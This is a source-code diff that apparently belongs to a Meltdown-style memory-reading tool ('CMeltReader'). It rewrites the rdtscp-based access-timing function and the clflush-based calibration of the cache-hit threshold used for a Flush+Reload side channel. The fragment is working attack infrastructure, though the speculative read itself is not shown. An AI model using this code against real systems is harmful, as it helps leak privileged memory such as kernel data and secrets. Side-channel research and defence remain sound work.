@@ -8,6 +8,7 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <fcntl.h>
+#include <algorithm>
 
 #include "meltreader.hpp"
 
@@ -24,19 +25,14 @@ CMeltReader::~CMeltReader()
 	munmap(m_probe_array, 256<<PAGE_BITS);
 }
 
-static __inline int get_access_time(volatile char *addr)
+static __inline int64_t get_access_time(volatile char *addr)
 {
 	uint32_t time1, time1h;
 	uint32_t time2, time2h;
-	volatile int j;
-	
-	__asm__ __volatile__ ("rdtscp" : "=a"(time1), "=d"(time1h));
-	j = *addr;
-	__asm__ __volatile__ ("rdtscp" : "=a"(time2), "=d"(time2h));
-	if (time1h == time2h)
-		return (int) (time2-time1);
-	else
-		return (int) (((uint64_t)(time2h-time1h) << 32) + time2 - time1);
+	__asm__ __volatile__ ("rdtscp" : "=a"(time1),"=d"(time1h)::"%rcx");
+	__asm__ __volatile__ ("movb 0(%0), %%cl" :: "r"(addr) :"%rcx");
+	__asm__ __volatile__ ("rdtscp" : "=a"(time2),"=d"(time2h)::"%rcx");
+	return ((int64_t)time2h<<32) + time2 - ((int64_t)time1h<<32) - time1;
 }
 
 static int mysqrt(long val)
@@ -51,31 +47,29 @@ static int mysqrt(long val)
 
 #define flushpos(addr) __asm__ __volatile__("mfence\n" "clflush 0(%0)\n" :: "r"(addr));
 
-#define ESTIMATE_CYCLES 1000000
+#define ESTIMATE_CYCLES 100
 void CMeltReader::find_cache_hit_threshold()
 {
-	long cached, uncached, i;
+	int64_t cached=0x7fffffff, uncached=0x7fffffff, i;
 	char * target_array = m_probe_array;
+	volatile int v;
 	
 	sched_yield();
-	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
-		cached += get_access_time(target_array);
-	
-	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
-		cached += get_access_time(target_array);
-	
-	for (uncached = 0, i = 0; i < ESTIMATE_CYCLES; i++) {
-		flushpos(target_array);
-		uncached += get_access_time(target_array);
+	for (i = 0; i < ESTIMATE_CYCLES; i++)
+	{
+		v = *(volatile int*)target_array;
+		cached = std::min<int64_t>(cached, get_access_time(target_array));
 	}
 	
-	cached /= ESTIMATE_CYCLES;
-	uncached /= ESTIMATE_CYCLES;
+	for (i = 0; i < ESTIMATE_CYCLES; i++) {
+		flushpos(target_array);
+		uncached = std::min<int64_t>(uncached, get_access_time(target_array));
+	}
 	
 	m_th1 = (int)mysqrt(cached*uncached);
 	m_th2 = uncached*2;
 	
-	fprintf(stderr, "cached = %ld, uncached = %ld, threshold %ld\n",
+	fprintf(stderr, "cached = %lld, uncached = %lld, threshold %ld\n",
 		   cached, uncached, m_th1);
 }
 
